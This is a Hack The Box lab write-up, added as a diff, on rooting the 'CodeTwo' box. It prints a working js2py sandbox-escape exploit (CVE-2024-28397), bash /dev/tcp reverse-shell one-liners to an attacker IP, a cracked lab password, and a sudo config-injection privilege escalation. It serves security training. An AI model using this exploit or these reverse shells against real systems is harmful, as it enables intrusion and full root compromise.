@@ -1,0 +1,122 @@
+Title: CodeTwo
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+CodeTwo was a Linux box centered on a Flask app that embeds `js2py` to run user-supplied JavaScript server-side. `js2py` has a known sandbox-escape vulnerability that lets JavaScript reach into Python's live object hierarchy and spawn a process, giving direct code execution as the app's service account. From there, an application SQLite database leaks a set of crackable password hashes, one of which grants SSH access as a local user. That user has passwordless sudo on `npbackup-cli`, a backup tool whose config file supports a `pre_exec_commands` hook - pointing sudo at an attacker-controlled config file turns that hook into arbitrary command execution as root.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.82
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+
+> nmap -sC -sV -p22,8000 10.10.11.82
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Welcome to CodeTwo
+```
+
+The site on port 8000 offers its own source code for download. Reviewing it showed the app uses `js2py` to evaluate JavaScript submitted by users, and the source also contained a plaintext secret value, `S3cr3tK3yC0d3Tw0`, though it wasn't needed for the path used to get a foothold.
+
+## Foothold - js2py Sandbox Escape (CVE-2024-28397)
+
+`js2py` is a pure-Python JavaScript interpreter, and CVE-2024-28397 is a known sandbox escape in it: from JavaScript, you can walk up through `Object.getOwnPropertyNames`/`__getattribute__` to reach Python's base `object` class, then recursively search `__subclasses__()` for `subprocess.Popen` and invoke it directly - all without the app ever calling into Python code itself. A public PoC for this was used almost as-is (https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape):
+
+```js
+let cmd = "/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.14.62/443 <&1'"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11
+```
+
+Submitting this to the site's JavaScript evaluation feature located the `subprocess.Popen` class through Python's live class tree and used it to run the reverse shell command, popping a shell on the box.
+
+## Credential Harvesting
+
+The compromised account's home directory pointed to `marco` as a local username, and an `instance/users.db` SQLite file was present. Pulling readable strings out of it recovered several password hashes:
+
+```
+81dc9bdb52d04dc20036dbd8313ed055
+cc175b9c0f1b6a831c399e2697726612
+25f9e794323b453885f5181f1b624d0b
+a97588c0e2fa3a024876339e27aeb42e
+649c9d65a206a75f5abe509fe128bce5
+```
+
+Running them through hashcat cracked one, which was tied to `marco`:
+
+```
+> hashcat -m 0 hash.txt rockyou.txt
+649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
+```
+
+```
+marco:sweetangelbabylove
+```
+
+## Lateral Movement - SSH as marco
+
+```
+> ssh marco@10.10.11.82
+```
+
+The cracked credentials worked directly over SSH, giving an interactive user shell.
+
+## Privilege Escalation - npbackup-cli Config Injection
+
+```
+marco> sudo -l
+(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+`npbackup-cli` runs as root via sudo with no password. Its config file (`npbackup.conf`) supports a `pre_exec_commands` list that runs before a backup job executes:
+
+```
+> cat npbackup.conf
+pre_exec_commands: []
+```
+
+Since sudo allows the config path to be supplied on the command line, the config itself is fully attacker-controlled. A copy of the config was made with a reverse shell command injected into `pre_exec_commands`:
+
+```
+> cp npbackup.conf evil.conf
+pre_exec_commands: [/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.14.62/443 <&1']
+```
+
+```
+marco> sudo /usr/local/bin/npbackup-cli -c /tmp/evil.conf -b -f
+```
+
+Running a backup job against the malicious config executed the `pre_exec_commands` entry as root, giving a root shell.
+
+## Takeaways
+
+- Embedding a JavaScript interpreter written in Python (like `js2py`) inside an app inherits that interpreter's own vulnerabilities - a sandbox escape in the interpreter is a sandbox escape in the app, regardless of what the app itself restricts.
+- Application database files are a recurring source of crackable credentials on these boxes; dumping strings from a SQLite file is often enough even without a proper SQL client.
+- Passwordless sudo on a binary that accepts an attacker-supplied config file (via a `-c`/`--config` style flag) is effectively full code execution as root whenever that config format supports any kind of command hook (pre/post-exec, hooks, scripts, etc.) - the binary name being "just a backup tool" doesn't make it safe.
